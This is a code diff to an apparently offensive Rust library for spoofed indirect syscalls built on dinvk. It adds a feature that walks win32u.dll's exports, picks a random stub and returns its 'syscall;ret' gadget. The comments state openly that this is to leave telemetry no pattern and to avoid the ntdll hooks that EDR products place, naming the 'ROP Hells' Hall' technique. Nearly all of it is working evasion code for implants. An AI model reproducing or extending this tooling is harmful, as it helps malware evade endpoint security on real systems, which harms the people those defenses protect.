@@ -9,6 +9,8 @@ use dinvk::hash::murmur3;
 use dinvk::helper::PE;
 
 use crate::cache::{cached_ntdll, cached_kernel32, cached_kernelbase};
+#[cfg(feature = "win32u_pivot")]
+use crate::cache::cached_win32u;
 
 #[cfg(feature = "desync")]
 use crate::util::find_base_thread_return_address;
@@ -273,7 +275,7 @@ pub mod __private {
 
                 config.is_syscall = true as u32;
                 config.ssn = dinvk::ssn(name, syscall_ntdll).context(s!("ssn not found"))?.into();
-                config.spoof_function = dinvk::get_syscall_address(addr)
+                config.spoof_function = unsafe { resolve_syscall_gadget(addr) }
                     .context(s!("syscall address not found"))? as *const c_void;
             }
             SpoofKind::SyscallAddr => {
@@ -284,7 +286,7 @@ pub mod __private {
                 config.is_syscall = true as u32;
                 config.ssn = unsafe { extract_ssn_from_addr(addr as *const u8) }
                     .context(s!("ssn extraction failed"))? as u32;
-                config.spoof_function = dinvk::get_syscall_address(addr)
+                config.spoof_function = unsafe { resolve_syscall_gadget(addr) }
                     .context(s!("syscall address not found"))? as *const c_void;
             }
         }
@@ -391,7 +393,7 @@ pub mod __private {
 
                 config.is_syscall = true as u32;
                 config.ssn = dinvk::ssn(name, ntdll).context(s!("ssn not found"))?.into();
-                config.spoof_function = dinvk::get_syscall_address(addr)
+                config.spoof_function = unsafe { resolve_syscall_gadget(addr) }
                     .context(s!("syscall address not found"))? as *const c_void;
             }
             SpoofKind::SyscallAddr => {
@@ -402,7 +404,7 @@ pub mod __private {
                 config.is_syscall = true as u32;
                 config.ssn = unsafe { extract_ssn_from_addr(addr as *const u8) }
                     .context(s!("ssn extraction failed"))? as u32;
-                config.spoof_function = dinvk::get_syscall_address(addr)
+                config.spoof_function = unsafe { resolve_syscall_gadget(addr) }
                     .context(s!("syscall address not found"))? as *const c_void;
             }
         }
@@ -1015,6 +1017,104 @@ unsafe fn extract_ssn_from_addr(func: *const u8) -> Option<u16> {
                     if target_ssn >= 0 && target_ssn <= 0xFFFF {
                         return Some(target_ssn as u16);
                     }
+                }
+            }
+        }
+
+        None
+    }
+}
+
+/// Resolve the `syscall;ret` gadget address used by the spoofed invocation.
+///
+/// Default path: scan the passed ntdll stub for `0F 05 C3` via
+/// `dinvk::get_syscall_address`. With the `win32u_pivot` feature active, this
+/// is overridden to pull the gadget from a randomly-selected win32u.dll
+/// export's own syscall stub — ROP Hells' Hall technique. SSN extraction
+/// still happens against the ntdll stub (Halo's Gate handles hooks), so only
+/// the kernel entry path moves; the SSN path is unchanged.
+///
+/// If `win32u_pivot` is compiled in but the win32u base has not been seeded
+/// (`init_win32u_base` never called), this falls back to the ntdll gadget —
+/// never silently fails a syscall just because the cache is cold.
+#[allow(unused_variables)]
+unsafe fn resolve_syscall_gadget(addr: *mut c_void) -> Option<u64> {
+    #[cfg(feature = "win32u_pivot")]
+    {
+        let win32u = cached_win32u();
+        if !win32u.is_null() {
+            if let Some(g) = unsafe { find_win32u_syscall_gadget(win32u) } {
+                return Some(g);
+            }
+        }
+        // Fall through to ntdll gadget
+    }
+    dinvk::get_syscall_address(addr)
+}
+
+/// Walk win32u.dll's export table and return a `syscall;ret` gadget address
+/// from one of its GUI syscall stubs. A caller-side PRNG picks which export
+/// to use so the gadget address rotates between invocations — no pattern for
+/// telemetry to key on.
+///
+/// win32u stubs end with the canonical `0F 05 C3` pair (they're Nt* syscalls
+/// into win32k), but because EDRs focus their hooks on ntdll, those bytes
+/// are almost always intact here. See RopHellsHall.c:98.
+#[cfg(feature = "win32u_pivot")]
+unsafe fn find_win32u_syscall_gadget(base: *mut c_void) -> Option<u64> {
+    const STUB_SCAN: usize = 0x20;
+
+    unsafe {
+        let base_u = base as usize;
+        let dos = base as *const u8;
+        let e_lfanew = core::ptr::read_unaligned(dos.add(0x3C) as *const i32);
+        if e_lfanew <= 0 || e_lfanew > 0x1000 {
+            return None;
+        }
+        let nt = dos.add(e_lfanew as usize);
+        // OptionalHeader.DataDirectory[0] = Export table (RVA, size) at NT+0x70 for PE32+
+        let export_rva = core::ptr::read_unaligned(nt.add(0x70) as *const u32) as usize;
+        if export_rva == 0 {
+            return None;
+        }
+        let export_dir = dos.add(export_rva);
+        let num_names = core::ptr::read_unaligned(export_dir.add(0x18) as *const u32) as usize;
+        if num_names == 0 {
+            return None;
+        }
+        let addrs_rva = core::ptr::read_unaligned(export_dir.add(0x1C) as *const u32) as usize;
+        let ord_rva = core::ptr::read_unaligned(export_dir.add(0x24) as *const u32) as usize;
+        let addrs = dos.add(addrs_rva) as *const u32;
+        let ords = dos.add(ord_rva) as *const u16;
+
+        // xorshift32 seeded from a stack address so each call picks differently
+        // without needing a heap-resident RNG. Not cryptographically random —
+        // doesn't need to be; just enough to avoid a fixed gadget address.
+        let mut state: u32 = {
+            let s = &num_names as *const _ as u32;
+            (s ^ 0x9E3779B9).wrapping_mul(0x85EBCA77) | 1
+        };
+        state ^= state << 13;
+        state ^= state >> 17;
+        state ^= state << 5;
+
+        let start = (state as usize) % num_names;
+        for i in 0..num_names {
+            let idx = (start + i) % num_names;
+            let ord = core::ptr::read_unaligned(ords.add(idx)) as usize;
+            let func_rva = core::ptr::read_unaligned(addrs.add(ord)) as usize;
+            if func_rva == 0 {
+                continue;
+            }
+            let stub = (base_u + func_rva) as *const u8;
+
+            for off in 0..STUB_SCAN {
+                let p = stub.add(off);
+                if core::ptr::read_volatile(p) == 0x0F
+                    && core::ptr::read_volatile(p.add(1)) == 0x05
+                    && core::ptr::read_volatile(p.add(2)) == 0xC3
+                {
+                    return Some(p as u64);
                 }
             }
         }
